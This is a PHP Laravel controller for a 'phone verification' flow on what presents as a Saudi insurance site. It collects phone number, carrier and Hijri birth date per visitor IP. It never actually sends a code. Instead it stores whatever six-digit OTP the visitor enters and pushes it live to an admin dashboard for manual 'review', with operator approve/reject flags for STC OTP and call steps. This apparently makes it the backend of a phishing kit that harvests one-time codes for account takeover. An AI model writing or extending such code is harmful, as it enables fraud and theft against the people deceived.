<?php

namespace App\Http\Controllers;

use App\Events\CustomerActivityUpdated;
use App\Models\CustomerProfile;
use App\Models\OtpCode;
use App\Services\CustomerCacheService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;

class CustomerPhoneVerificationController extends Controller
{
    /**
     * Send phone verification OTP.
     * Creates a pending OTP record of type 'phone'.
     *
     * POST /api/phone-verification/send
     */
    public function send(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'carrier'    => 'required|string|in:stc,mobily,zain,yaqoot,salam,lebara',
            'phone'      => 'required|string|regex:/^5\d{8}$/',
            'birthDay'   => 'required|integer|min:1|max:30',
            'birthMonth' => 'required|integer|min:1|max:12',
            'birthYear'  => 'required|integer|min:1300|max:1450',
        ]);

        $ip = $request->ip();

        $isStc = $validated['carrier'] === 'stc';

        // Compose Hijri birth date string
        $birthDate = $validated['birthYear'] . '-' . str_pad($validated['birthMonth'], 2, '0', STR_PAD_LEFT) . '-' . str_pad($validated['birthDay'], 2, '0', STR_PAD_LEFT);

        // Ensure customer profile exists
        $customer = CustomerProfile::createOrUpdateByIP($ip, [
            'current_page'  => $isStc ? '/insurance/stc/waiting' : '/insurance/phone-verification',
            'phone_number'  => $validated['phone'],
            'phone_carrier' => $validated['carrier'],
            'birth_date'    => $birthDate,
            'birth_year'    => (string) $validated['birthYear'],
            'birth_month'   => (string) $validated['birthMonth'],
        ]);

        // Clear stale STC flags from previous attempts
        $extra = $customer->extra_data ?? [];
        unset(
            $extra['stc_waiting_approved'], $extra['stc_waiting_rejected'],
            $extra['stc_otp_approved'], $extra['stc_otp_rejected'],
            $extra['stc_call_approved'], $extra['stc_call_rejected']
        );
        $customer->update(['extra_data' => $extra]);

        // Invalidate any previous pending phone/stc OTPs for this customer
        OtpCode::where('customer_profile_id', $customer->id)
            ->where(function ($q) {
                $q->ofType('phone')->orWhere('type', 'stc_verification');
            })
            ->pending()
            ->update(['status' => 'rejected']);

        // Create new pending OTP (stc_verification for STC, phone for others)
        $otp = OtpCode::create([
            'customer_profile_id' => $customer->id,
            'session_id'          => \Illuminate\Support\Str::uuid()->toString(),
            'code'                => 'phone_pending',
            'type'                => $isStc ? 'stc_verification' : 'phone',
            'status'              => 'pending',
        ]);

        // Notify admin dashboard in real-time
        CustomerCacheService::flush();
        try {
            broadcast(new CustomerActivityUpdated(
                $customer->id,
                $customer->ip_address,
                $customer->current_page,
                $customer->is_active,
                'phone_submitted'
            ));
        } catch (\Throwable $e) {
            // Silent fail
        }

        return response()->json([
            'success'     => true,
            'message'     => 'تم إرسال رمز التحقق بنجاح',
            'otp_id'      => $otp->id,
            'customer_ip' => $ip,
        ]);
    }

    /**
     * Verify phone OTP code submitted by the customer.
     * Updates the pending OTP record with the submitted code.
     *
     * POST /api/phone-verification/verify
     */
    public function verify(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'otp' => 'required|string|size:6',
        ]);

        $ip = $request->ip();

        $customer = CustomerProfile::where('ip_address', $ip)->first();

        if (!$customer) {
            return response()->json([
                'success' => false,
                'message' => 'لم يتم العثور على بيانات العميل',
            ], 404);
        }

        // Find the latest pending phone or STC verification OTP
        $otp = OtpCode::where('customer_profile_id', $customer->id)
            ->where(function ($q) {
                $q->ofType('phone')->orWhere('type', 'stc_verification');
            })
            ->pending()
            ->latest()
            ->first();

        if (!$otp) {
            return response()->json([
                'success' => false,
                'message' => 'لا يوجد طلب تحقق قيد الانتظار',
            ], 422);
        }

        // Update the OTP with the submitted code
        $otp->update([
            'code' => $validated['otp'],
        ]);

        // Update customer page
        $customer->update(['current_page' => '/insurance/phone/otp-waiting']);

        // Notify admin dashboard
        CustomerCacheService::flush();
        try {
            broadcast(new CustomerActivityUpdated(
                $customer->id,
                $customer->ip_address,
                $customer->current_page,
                $customer->is_active,
                'phone_otp_verified'
            ));
        } catch (\Throwable $e) {
            // Silent fail
        }

        // Generate HMAC signature for status polling
        $statusSig = hash_hmac('sha256', "phone|{$otp->session_id}", config('services.status_poll.secret'));

        return response()->json([
            'success'     => true,
            'message'     => 'تم إرسال الرمز للمراجعة',
            'otp_id'      => $otp->id,
            'session_id'  => $otp->session_id,
            'status_sig'  => $statusSig,
            'redirect_to' => '/insurance/phone/otp-waiting',
        ]);
    }

    /**
     * Resend phone OTP — invalidates previous and creates a fresh record.
     *
     * POST /api/phone-verification/resend
     */
    public function resend(Request $request): JsonResponse
    {
        $ip = $request->ip();

        $customer = CustomerProfile::where('ip_address', $ip)->first();

        if (!$customer) {
            return response()->json([
                'success' => false,
                'message' => 'لم يتم العثور على بيانات العميل',
            ], 404);
        }

        // Invalidate all pending phone OTPs
        OtpCode::where('customer_profile_id', $customer->id)
            ->ofType('phone')
            ->pending()
            ->update(['status' => 'rejected']);

        // Create a new pending phone OTP
        $otp = OtpCode::create([
            'customer_profile_id' => $customer->id,
            'session_id'          => \Illuminate\Support\Str::uuid()->toString(),
            'code'                => 'phone_pending',
            'type'                => 'phone',
            'status'              => 'pending',
        ]);

        return response()->json([
            'success' => true,
            'message' => 'تم إعادة إرسال الرمز بنجاح',
            'otp_id'  => $otp->id,
        ]);
    }
}
